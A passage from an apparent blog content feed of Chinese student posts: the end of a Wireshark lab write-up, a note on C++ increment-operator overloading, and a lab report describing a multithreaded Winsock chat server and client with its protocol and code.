aria-hidden="true">image-20221028193717733</figcaption></figure><p>再之后请求图片：</p><p>同时我们可以看到图片信息也请求成功。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210729172278_543_20221028232118651904_458_image-20221028194251309.png" alt="image-20221028194251309"><figcaption aria-hidden="true">image-20221028194251309</figcaption></figure><blockquote><p>在 <code>vim</code> 内调用 <code>:%!xxd</code>命令，其实就是调用系统的 <code>xxd</code>命令，对打开的内容进行16进制转换。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C++运算符重载</title>
    <link href="/posts/53807/"/>
    <url>/posts/53807/</url>
    
    <content type="html"><![CDATA[<h1 id="c运算符重载">C++运算符重载</h1><p>关于重载自增自减运算符的一些深入讨论：</p><p><a href="http://c.biancheng.net/view/247.html">参考</a></p><p>通常我们重载前置<code>++</code>运算符的返回值类型是 Obj&amp;，而后置<code>++</code>运算符的返回值类型是Obj，这是因为运算符重载最好保持原运算符的用法。C++固有的前置<code>++</code>运算符的返回值本来就是操作数的引用，而后置<code>++</code>运算符的返回值则是操作数值修改前的复制品。</p><p>例如：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-rhaie7lluxp18y"></i><span>C++</span><div class="collapse show" id="collapse-rhaie7lluxp18y"><pre><code class="hljs C++"><span class="hljs-type">int</span> a = <span class="hljs-number">5</span>;(++a) = <span class="hljs-number">2</span>;</code></pre></div></div><p>上面两条语句执行后，a 的值是 2，因为 ++a 的返回值是 a 的引用。而</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-rzymrilluxp18y"></i><span>C++</span><div class="collapse show" id="collapse-rzymrilluxp18y"><pre><code class="hljs C++">(a++) = <span class="hljs-number">2</span>;</code></pre></div></div><p>这条语句是非法的，因为 a++ 的返回值不是引用，不能作为左值。</p><p>换句话说，前置<code>++</code>返回左值，后置<code>++</code>返回右值。</p><p>当然，如果我们还重载了对象的加减等运算符，希望自增自减参与对象的这些运算，返回的应当是对象(这也是推荐的做法)，如果希望得到自增自减的“数值”，可以返回<code>int</code>。</p><p>但如果重载后置运算符时返回的是引用，有可能破坏类的封装性。如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9dgxjmlluxp18y"></i><span>c++</span><div class="collapse show" id="collapse-9dgxjmlluxp18y"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-keyword">class</span> <span class="hljs-title class_">Sample</span>{    <span class="hljs-type">int</span> n;<span class="hljs-keyword">public</span>:    <span class="hljs-built_in">Sample</span>():<span class="hljs-built_in">n</span>(<span class="hljs-number">0</span>){}    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">Sample</span><span class="hljs-params">(<span class="hljs-type">int</span> m)</span></span>{n=m;};    <span class="hljs-type">int</span>&amp; <span class="hljs-keyword">operator</span>--(<span class="hljs-type">int</span>){        n--;        <span class="hljs-keyword">return</span> n;    }    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">disp</span><span class="hljs-params">()</span></span>{        cout&lt;&lt;n&lt;&lt;endl;    }};<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{    <span class="hljs-function">Sample <span class="hljs-title">s</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>;    (s--)++;    s.<span class="hljs-built_in">disp</span>();    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><p><code>(s--)</code>直接返回内部私有变量<code>n</code>的引用，则外部的++可越过限制改变其值。</p><h2 id="继承和多态">继承和多态</h2><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/C%2B%2B%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD/20230828205656079244_989_20230519102654183213_668_image-20230421161915507.png" alt="image-20230421161915507"><figcaption aria-hidden="true">image-20230421161915507</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/C%2B%2B%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD/20230828205657987626_516_20230519102655890997_284_image-20230421161949156.png" alt="image-20230421161949156"><figcaption aria-hidden="true">image-20230421161949156</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络实验一_socket聊天程序</title>
    <link href="/posts/54779/"/>
    <url>/posts/54779/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机网络实验一_socket聊天程序">计算机网络实验一_Socket聊天程序</h1><p>2013599 田佳业</p><h2 id="实验要求">实验要求</h2><p>使用流式Socket，设计一个两人聊天协议，要求聊天信息带有时间标签。请完整地说明交互消息的类型、语法、语义、时序等具体的消息处理方式。拓展实现功能（如群聊、多线程等）</p><h2 id="程序流程展示">程序流程展示</h2><h3 id="模块说明">模块说明</h3><p>此实验使用了Windows多线程的方式实现了多人聊天功能，流程和协议设计如下图所示：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80_socket%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/20230828210335407540_697_20221026193748648308_976_connect.png" alt="connect"><figcaption aria-hidden="true">connect</figcaption></figure><p>对于每一个用户的聊天过程，分为建连阶段和聊天阶段。</p><h3 id="建连阶段">建连阶段</h3><h4 id="流程设计">流程设计</h4><h5 id="服务器">服务器</h5><p>服务器主要做了以下工作：</p><ul><li><p>设置最大聊天人数并在接收连接前验证</p></li><li><p>建立socket，绑定ip和端口号，进入监听模式进行等待</p></li><li><p>客户端连接后，得到客户端输入的用户名，验证是否在已有用户列表，若否，为其单独创建线程并在<code>socket</code>池中为其分配<code>socket</code></p></li><li><p>连接成功，向其发送欢迎信息并通知在线的用户</p></li><li><p>每当用户连接成功后，服务器显示用户信息及连接时间。</p></li></ul><p>注：下图包含了一次客户端断开重连的过程，可以看到服务器能够正确的识别这一过程，且对在线人数进行更新。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80_socket%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/20230828210336576641_482_20221026193750618844_199_image-20221022211508575.png" alt="image-20221022211508575"><figcaption aria-hidden="true">image-20221022211508575</figcaption></figure><h5 id="客户端">客户端</h5><ul><li><p>由于程序默认在<code>localhost</code>上运行，因此客户端只需要手动选择正确的端口号与服务器进行连接，若连接失败，退出程序。</p></li><li><p>之后输入用户名，这里需要注意用户名不能与关键字(在该程序中为<code>quit</code>和<code>all</code>)。当然在本地验证即可。等待服务器确认信息后，建立两个线程：发送和接收线程，以防止阻塞。</p></li></ul><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80_socket%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/20230828210337806803_216_20221026193752409499_274_image-20221022211345244.png" alt="客户端"><figcaption aria-hidden="true">客户端</figcaption></figure><p>下面是上线通知的实现效果：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80_socket%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/20230828210339188874_417_20221026193754614735_579_image-20221022211828762.png" alt="上线通知"><figcaption aria-hidden="true">上线通知</figcaption></figure><h4 id="协议设计">协议设计</h4><p>由于此部分界限明确，且不涉及与其他服务器的交互，为保证速度和效率，从简设计即可。只传输最需要的东西。并且由于这个过程顺序是且必须是确定的，串行执行共用端口不至混淆。</p><h3 id="聊天阶段">聊天阶段</h3><h4 id="流程设计-1">流程设计</h4><h5 id="服务器事件">服务器事件</h5><p>程序在调度设计中着重注意了一点：在整个聊天室中，服务器可以作为“管理员”向用户发送消息，而不仅仅实现转发功能。为了实现这一点，程序采用了子线程的方式。主线程除了创建socket便将与客户端建立连接的过程交给子线程去干，服务端负责转发的线程由子线程创建。主线程自己则进入等待输入的过程。</p><p>主线程有输入分一下两种情况：正常字符串和<code>exit</code>。正常字符串会即时群发给所有在线用户并标记为<code>SERVER</code>信息。若输入<code>exit</code>则退出服务器，并在退出之前向客户端群发通告，并同时退出客户端的程序。</p><p>以下两幅图片展示了客户端收到的对应的情况。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80_socket%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/20230828210340324749_887_20221026193756459285_459_image-20221022214111930.png" alt="image-20221022214111930"><figcaption aria-hidden="true">image-20221022214111930</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80_socket%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/20230828210341264659_427_20221026193758300289_769_image-20221022213615110.png" alt="image-20221022213615110"><figcaption aria-hidden="true">image-20221022213615110</figcaption></figure><h5 id="客户端事件">客户端事件</h5><p>按照同样的方式可以实现客户端离线群发功能。不再赘述。当然，断开后删除个人信息并更新计数也是必要的。</p><h5 id="私聊和群聊">私聊和群聊</h5><p>可以从上述图片中看出客户端命令行有两个参数：发送对象和消息。</p><p>从实现上，这两种方式没有本质的区别。稍微需要注意的一些细节主要是群发不需要发给请求方，但私发时如果选择发送给自己，自己仍然可以收到消息。</p><p>下图展示了私聊和群聊的结果。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80_socket%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/20230828210343217430_922_20221026193759994557_881_image-20221022224632714.png" alt="image-20221022224632714"><figcaption aria-hidden="true">image-20221022224632714</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80_socket%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/20230828210344165219_729_20221026193801774887_602_image-20221022224533046.png" alt="image-20221022224533046"><figcaption aria-hidden="true">image-20221022224533046</figcaption></figure><h4 id="协议设计-1">协议设计</h4><p>协议设计中关注了一下几点：</p><ol type="1"><li><p>在线状况下，根据<code>socket ID</code>和用户信息表，可以知道是谁发的，因此传递报文时发送者只需要向服务器传递接受者是谁，服务器转发时将对应字段改为发送者姓名即可。这样虽然增加了服务器压力，但能够有效减少报文长度。</p></li><li><p>控制位仅需一个字节。当然这就像<code>HTTP</code>状态码一样，是建立在共识之上的。</p></li><li><p>消息中需要包含时间戳。因为聊天程序中的时间是需要以发送时间为准的。当然接收时间可以从系统获得，基于此也可以进行时延计算。</p></li></ol><p>以下是程序中关于协议中控制部分的宏定义：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-qib8rllluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-qib8rllluwpkzv"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NEW_C <span class="hljs-string">'N'</span> <span class="hljs-comment">// new client</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUB_C <span class="hljs-string">'P'</span> <span class="hljs-comment">// public message</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRI_C <span class="hljs-string">'R'</span>  <span class="hljs-comment">// private message</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> QUIT_C <span class="hljs-string">'Q'</span> <span class="hljs-comment">// quit</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> HELLO_C <span class="hljs-string">'H'</span> <span class="hljs-comment">// hello message from server</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXIT_C <span class="hljs-string">'T'</span> <span class="hljs-comment">// exit message from server (server is closed)</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERR_C <span class="hljs-string">'E'</span> <span class="hljs-comment">// error message from server</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVER_C <span class="hljs-string">'V'</span> <span class="hljs-comment">// normal server message</span></span></code></pre></div></div><h2 id="程序代码解释">程序代码解释</h2><p>具体代码的含义大多在程序中有注释。下面的文字叙述部分主要着眼函数和线程模块划分和功能实现上。</p><p>C++中对字符串的处理<code>char*</code>和<code>string</code>各有各的优势，有时也会出现各种奇怪的坑，在写代码时一度让人很头疼，因此也在某些地方会有一些不太优雅的写法。</p><h3 id="环境配置">环境配置</h3><p>在<code>cmake</code>项目中进行<code>socket</code>编程需要在CMakeLists中添加以下内容，否则不能正常编译：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-l0porglluwpkzv"></i><span>cmake</span><div class="collapse show" id="collapse-l0porglluwpkzv"><pre><code class="hljs cmake"><span class="hljs-keyword">cmake_minimum_required</span>(VERSION <span class="hljs-number">3.21</span>)<span class="hljs-keyword">project</span>(chatting)<span class="hljs-keyword">set</span>(CMAKE_EXE_LINKER_FLAGS <span class="hljs-string">"-static"</span>)<span class="hljs-keyword">set</span>(CMAKE_CXX_STANDARD <span class="hljs-number">14</span>)<span class="hljs-keyword">link_libraries</span>(ws2_32 wsock32)<span class="hljs-keyword">add_executable</span>(server server.cpp)<span class="hljs-keyword">add_executable</span>(client client.cpp)</code></pre></div></div><p>需额外包含的头文件：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ublw8elluwpkzv"></i><span>cmake</span><div class="collapse show" id="collapse-ublw8elluwpkzv"><pre><code class="hljs cmake"><span class="hljs-comment">#include &lt;windows.h&gt;</span><span class="hljs-comment">#include &lt;WinSock2.h&gt;</span><span class="hljs-comment">#pragma comment(lib, "ws2_32.lib")</span></code></pre></div></div><h3 id="工具类">工具类</h3><p><code>color.h</code>以及部分<code>helper.h</code>的代码主要定义了一些与控制台颜色以及格式化输出显示相关的宏及函数。</p><p><code>print_toggle</code>主要用来格式化打印控制台输出。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-c9huyqlluwpkzv"></i><span>reasonml</span><div class="collapse show" id="collapse-c9huyqlluwpkzv"><pre><code class="hljs reasonml">print<span class="hljs-constructor">_toggle(<span class="hljs-params">const</span> <span class="hljs-params">string</span>&amp; <span class="hljs-params">type</span>,<span class="hljs-params">const</span> <span class="hljs-params">string</span> &amp;<span class="hljs-params">txt</span>,<span class="hljs-params">const</span> <span class="hljs-params">string</span>&amp; <span class="hljs-params">time_str</span>=<span class="hljs-string">""</span>)</span></code></pre></div></div><p>第一个参数是打印格式，取值是下面的宏定义，决定了输出以怎样的颜色和格式进行。第二个参数是内容。并附带可选参数时间。</p><p>宏的定义如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0twomdlluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-0twomdlluwpkzv"><pre><code class="hljs c++"><span class="hljs-comment">//message datagram parameters</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> NAME_SIZE 12</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> TXT_SIZE 125</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_SIZE 144</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> TIME_SIZE 6</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> TXT_PTR 1</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> TIME_PTR 126</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> NAME_PTR 132</span><span class="hljs-comment">//console line type parameters</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERR <span class="hljs-string">"E"</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> INFO <span class="hljs-string">"I"</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> NEW <span class="hljs-string">"N"</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> LOG <span class="hljs-string">"L"</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> TIP <span class="hljs-string">"T"</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> SUC <span class="hljs-string">"S"</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> WARN <span class="hljs-string">"W"</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVER <span class="hljs-string">"V"</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> GONE <span class="hljs-string">"G"</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> DUL <span class="hljs-string">"D"</span> <span class="hljs-comment">// dulplicate name</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> HELLO <span class="hljs-string">"H"</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUB <span class="hljs-string">"P"</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRI <span class="hljs-string">"R"</span></span></code></pre></div></div><p>第一部分主要是方便对数据保处理时使用，第二部分则是在控制台上显示相关命令是需要的宏。</p><h3 id="初始化工作">初始化工作</h3><h4 id="服务器端">服务器端</h4><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ytcwlklluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-ytcwlklluwpkzv"><pre><code class="hljs c++"><span class="hljs-comment">//initialize websocket</span>WSADATA wsaData;<span class="hljs-keyword">if</span> (<span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsaData) != <span class="hljs-number">0</span>) {    <span class="hljs-built_in">print_toggle</span>(ERR, <span class="hljs-string">"WSAStartup failed"</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;}<span class="hljs-built_in">print_toggle</span>(LOG, <span class="hljs-string">"WSAStartup success"</span>);SOCKET sock_server = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);SOCKADDR_IN server_addr;server_addr.sin_family = AF_INET;server_addr.sin_port = <span class="hljs-built_in">htons</span>(PORT);server_addr.sin_addr.S_un.S_addr = <span class="hljs-built_in">inet_addr</span>(LOCALHOST);<span class="hljs-built_in">bind</span>(sock_server, (SOCKADDR *) &amp;server_addr, <span class="hljs-built_in">sizeof</span>(SOCKADDR));<span class="hljs-keyword">if</span> (<span class="hljs-built_in">listen</span>(sock_server, <span class="hljs-number">5</span>) == SOCKET_ERROR) {    <span class="hljs-built_in">print_toggle</span>(ERR, <span class="hljs-string">"listen failed"</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}<span class="hljs-built_in">print_toggle</span>(LOG, <span class="hljs-string">"listen success"</span>);</code></pre></div></div><h4 id="客户端-1">客户端：</h4><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-t445wplluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-t445wplluwpkzv"><pre><code class="hljs c++">WSADATA wsaData;<span class="hljs-keyword">if</span> (<span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsaData) != <span class="hljs-number">0</span>) {    <span class="hljs-built_in">print_toggle</span>(ERR, <span class="hljs-string">"WSAStartup failed"</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;}<span class="hljs-built_in">print_toggle</span>(LOG, <span class="hljs-string">"WSAStartup success"</span>);SOCKET sockClient = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<span class="hljs-built_in">print_toggle</span>(TIP, <span class="hljs-string">"the chat room is on the localhost"</span>);<span class="hljs-built_in">print_toggle</span>(TIP, <span class="hljs-string">"please input port:"</span>);cin &gt;&gt; port;SOCKADDR_IN addrSrv;addrSrv.sin_family = AF_INET;addrSrv.sin_port = <span class="hljs-built_in">htons</span>(port);addrSrv.sin_addr.S_un.S_addr = <span class="hljs-built_in">inet_addr</span>(LOCALHOST);<span class="hljs-keyword">if</span> (<span class="hljs-built_in">connect</span>(sockClient, (SOCKADDR *) &amp;addrSrv, <span class="hljs-built_in">sizeof</span>(SOCKADDR)) != <span class="hljs-number">0</span>) {    <span class="hljs-built_in">print_toggle</span>(ERR, <span class="hljs-string">"connect failed"</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;}<span class="hljs-built_in">print_toggle</span>(SUC, <span class="hljs-string">"connect success"</span>, <span class="hljs-built_in">get_time_str</span>());</code></pre></div></div><p>这一部分是服务器端创建<code>socket</code>和客户端连接<code>socket</code>必需的代码，课上也有讲述，此处不一一详细说明。</p><h3 id="服务器进程">服务器进程</h3><h4 id="主线程">主线程</h4><p>这一部分主要做的工作是初始化套接字池，并使用<code>client_manager</code>函数创建线程，以监听客户端连接。之后便监听输入以控制服务器群发消息或退出。另外，如果没有客户端连接，显然套接字池中所有套接字都不可用，什么也不用做。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-h9hopblluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-h9hopblluwpkzv"><pre><code class="hljs c++">    <span class="hljs-comment">//initialize socket array</span>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> &amp;sock_connect: sock_connects) {        sock_connect = INVALID_SOCKET;    }    <span class="hljs-comment">//create a thread to handle new clients</span>    HANDLE hThread = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-number">0</span>, client_manager, (LPVOID) &amp;sock_server, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (hThread == <span class="hljs-literal">nullptr</span>) {        <span class="hljs-built_in">print_toggle</span>(ERR, <span class="hljs-string">"create thread failed"</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    }    <span class="hljs-comment">//input "exit" to exit</span>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {        <span class="hljs-type">char</span> input[<span class="hljs-number">100</span>];        cin.<span class="hljs-built_in">getline</span>(input, <span class="hljs-number">100</span>);        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(input, <span class="hljs-string">"exit"</span>) == <span class="hljs-number">0</span>) {            <span class="hljs-comment">// tell all clients that the server is going to shut down</span>            <span class="hljs-type">char</span> msg[MSG_SIZE];            <span class="hljs-built_in">memset</span>(msg, <span class="hljs-number">0</span>, MSG_SIZE);            msg[<span class="hljs-number">0</span>] = EXIT_C;            string content = <span class="hljs-string">"server has shut down"</span>;            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TXT_SIZE; i++) {                msg[TXT_PTR + i] = content[i];            }            <span class="hljs-built_in">broadcast</span>(msg, <span class="hljs-number">-1</span>);            <span class="hljs-comment">//stop the client_manager thread</span>            <span class="hljs-built_in">TerminateThread</span>(hThread, <span class="hljs-number">0</span>);            <span class="hljs-comment">//close server socket</span>            <span class="hljs-built_in">closesocket</span>(sock_server);            <span class="hljs-keyword">break</span>;        } <span class="hljs-keyword">else</span> {            <span class="hljs-comment">//send msg to all clients</span>            <span class="hljs-type">char</span> msg[MSG_SIZE];            <span class="hljs-built_in">memset</span>(msg, <span class="hljs-number">0</span>, MSG_SIZE);            msg[<span class="hljs-number">0</span>] = SERVER_C;            <span class="hljs-type">char</span> txt[TXT_SIZE];            <span class="hljs-built_in">strcpy</span>(txt, input);            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; TXT_SIZE; j++) {                msg[j + TXT_PTR] = txt[j];            }            <span class="hljs-comment">//add time</span>            <span class="hljs-type">char</span> time[TIME_SIZE];            <span class="hljs-built_in">strcpy</span>(time, <span class="hljs-built_in">get_time_str</span>().<span class="hljs-built_in">c_str</span>());            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; TIME_SIZE; j++)                msg[j + TIME_PTR] = time[j];            <span class="hljs-built_in">broadcast</span>(msg);        }    }    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><p>其中的<code>broadcast</code>函数便是群发消息所使用的是。下面看其实现：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-vsufmllluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-vsufmllluwpkzv"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">broadcast</span><span class="hljs-params">(<span class="hljs-type">char</span> msg[MSG_SIZE], <span class="hljs-type">int</span> id = <span class="hljs-number">-1</span>)</span> </span>{    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAX_CLIENT; i++) {        <span class="hljs-keyword">if</span> (sock_connects[i] != INVALID_SOCKET &amp;&amp; i != id) {            <span class="hljs-comment">//we don't send the message to the sender</span>            <span class="hljs-built_in">send</span>(sock_connects[i], msg, MSG_SIZE, <span class="hljs-number">0</span>);        }    }}</code></pre></div></div><p>依次检查<code>socket</code>池，然后给有效且不是<code>id</code>对应的socket发送消息。</p><h4 id="客户端连接线程">客户端连接线程</h4><p><code>[[noreturn]]</code>表明这个函数自始至终监听新加入的<code>socket</code>。连接时服务器不提示，发送用户名时服务器进行第一次消息接收并根据情况发送欢迎信息或要求客户端重新输入用户名。每次接收消息循环结束，表示有客户端进入或离开，更新一次在线信息，并启动<code>handle_msg</code>线程进行消息转发。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zmqlbflluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-zmqlbflluwpkzv"><pre><code class="hljs c++">[[noreturn]] <span class="hljs-function">DWORD WINAPI <span class="hljs-title">client_manager</span><span class="hljs-params">(LPVOID lparam)</span> </span>{    <span class="hljs-comment">//accept new clients</span>    <span class="hljs-keyword">auto</span> *sock_server = (SOCKET *) lparam;    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {        <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span> (; index &lt; MAX_CLIENT; index++) {            <span class="hljs-keyword">if</span> (sock_connects[index] == INVALID_SOCKET)                <span class="hljs-keyword">break</span>;        }        <span class="hljs-keyword">if</span> (index == MAX_CLIENT) {            <span class="hljs-built_in">print_toggle</span>(WARN, <span class="hljs-string">"the server is full"</span>);            <span class="hljs-keyword">continue</span>;        }        SOCKADDR_IN addrClient;        <span class="hljs-type">int</span> lenAddr = <span class="hljs-built_in">sizeof</span>(SOCKADDR);        sock_connects[index] = <span class="hljs-built_in">accept</span>(*sock_server, (SOCKADDR *) &amp;addrClient, &amp;(lenAddr));        <span class="hljs-keyword">if</span> (sock_connects[index] == SOCKET_ERROR) {            <span class="hljs-built_in">print_toggle</span>(ERR, <span class="hljs-string">"could not accept client!"</span>);            sock_connects[index] = INVALID_SOCKET;            <span class="hljs-keyword">continue</span>;        }        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {            <span class="hljs-type">char</span> name[NAME_SIZE];            <span class="hljs-built_in">recv</span>(sock_connects[index], name, NAME_SIZE, <span class="hljs-number">0</span>);            <span class="hljs-keyword">if</span> (username_map.<span class="hljs-built_in">find</span>(<span class="hljs-built_in">string</span>(name)) == username_map.<span class="hljs-built_in">end</span>()) {                username_map.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">pair</span>&lt;string, <span class="hljs-type">int</span>&gt;(<span class="hljs-built_in">string</span>(name), index));                <span class="hljs-built_in">send</span>(sock_connects[index], HELLO, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);                string new_client = <span class="hljs-string">"new client: "</span> + <span class="hljs-built_in">string</span>(name) + <span class="hljs-string">" entered the chat room"</span>;                string online = <span class="hljs-string">"online:"</span> + <span class="hljs-built_in">to_string</span>(username_map.<span class="hljs-built_in">size</span>());                <span class="hljs-comment">//get the id of the new client</span>                <span class="hljs-type">int</span> id = username_map[<span class="hljs-built_in">string</span>(name)];                <span 